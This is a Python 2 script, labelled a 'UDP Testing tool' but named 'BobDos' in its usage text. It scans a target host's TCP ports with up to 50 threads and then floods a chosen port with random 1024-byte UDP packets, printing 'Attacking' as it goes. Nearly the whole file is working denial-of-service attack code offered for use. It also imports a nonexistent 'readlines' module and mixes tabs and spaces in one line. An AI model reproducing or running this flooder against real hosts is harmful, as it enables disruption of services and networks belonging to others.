#!/usr/bin/python
#
# UDP Testing tool
#
# Author: LukeBob

import threading
from datetime import datetime
import subprocess
import time
import sys, traceback
import socket
import random
import sys
import readlines

MAX_THREADS = 50



class colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

split = colors.BOLD + "=================================================" + colors.ENDC

def usage():
    print "\n"
    print "BobDos v.1"
    print "==========="
    print ""
    print "usage: ./BobDos <host>   |OR|   ./BobDos <host> <start port> <end port>"
    
class Scanner(threading.Thread):
    def __init__(self, host, port):
        threading.Thread.__init__(self)
        # host and port
        self.host = host
        self.port = port
        # build up the socket obj
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def run(self):
        try:
            # connect to the given host:port
            self.sock.connect((self.host, self.port))
            print "%s: %d OPEN" %(self.host, self.port)
            self.sock.close()
        except: pass

class pyScan:
    def __init__(self, args=[]):
        # arguments vector
        self.args = args
        # start port and end port
        self.start, self.stop = 1, 65535
        # host name
        self.host = ""

        # check the arguments
        if len(self.args) == 4:
            self.host = self.args[1]
            try:
                subprocess.call("clear", shell=True)
                self.start = int(self.args[2])
                self.stop = int(self.args[3])
                print "\n"
                print "Scanning:", sys.argv[1]
                print split
            except ValueError:
                usage()
                return
            if self.start > self.stop:
                usage()
                return
        elif len(self.args) == 2:
            subprocess.call("clear", shell=True)
            self.host = self.args[1]
            print "\n"
            print "Scanning:", sys.argv[1]
            print split
        else:
            usage()
            return

        try:
            socket.gethostbyname(self.host)
        except:
            print "hostname '%s' unknown" % self.host
        self.scan(self.host, self.start, self.stop)

    def scan(self, host, start, stop):
        try:
            t1 = datetime.now()
            self.port = start
            while self.port <= self.stop:
                while threading.activeCount() < MAX_THREADS:
                    Scanner(host, self.port).start()
                    self.port += 1
                    t2 = datetime.now()
                    if self.port == self.stop:
                        time.sleep(5)
                        total = t2 - t1
                        print split
                        print "\n"
                        print 'Scan Complete in: ',(total)
                        print "\n"
                        Flood()                  

        except KeyboardInterrupt:
            print "Exiting..."
        except Exception:
            traceback.print_exc(file=sys.stdout)
        sys.exit(0)

                    
def Flood():
    try:
        target = sys.argv[1]
        host = socket.gethostbyname(target)
        print split
        length = int(raw_input("How many Packets Would you like to send?: "))
        print split
        #MESSAGE = raw_input("Message?: ")
        print ""
        print split
        PORT = int(raw_input("Target Port?: ")) 
        SENT=0
        print split
        print ""
        time.sleep(1)
        subprocess.call('clear', shell=True)
        print "\n"
        print "Sending Data..."
        print split  
        for i in range(length):
            bytes = random._urandom(1024)
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
            sock.sendto(bytes, (host, PORT))
            time.sleep(0.01)
	    SENT=SENT+1
            print "(Attacking: %s) (Sent %s Packets) (Destination Port: %s)"%(host, SENT, PORT)
        sys.exit(0)   
           
               

    except KeyboardInterrupt:
        print "Exiting..."
    except Exception:
        traceback.print_exc(file=sys.stdout)
    sys.exit(0)


if __name__ == '__main__':
  try:
    pyScan(sys.argv)
  except KeyboardInterrupt:
    print "Exiting..."
  except Exception:
    traceback.print_exc(file=sys.stdout)
  sys.exit(0)
